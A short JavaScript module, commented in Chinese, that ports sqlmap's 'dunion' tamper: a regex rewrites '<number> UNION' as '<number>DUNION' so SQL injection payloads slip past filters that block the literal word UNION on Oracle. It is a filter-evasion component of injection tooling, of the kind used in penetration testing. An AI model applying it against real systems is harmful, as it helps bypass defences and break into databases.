// <数字> UNION → <数字>DUNION（对标 sqlmap dunion.py）
// 在整数与 UNION 之间插入 D，利用 Oracle 对数字后接标识符的容错解析绕过 UNION 字面过滤。
export const dunion = {
  name: 'dunion',
  description: '将 <数字> UNION 改写为 <数字>DUNION，绕过 UNION 字面过滤',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    return payload.replace(/(\d+)\s+(UNION )/gi, '$1D$2');
  },
};

export default dunion;
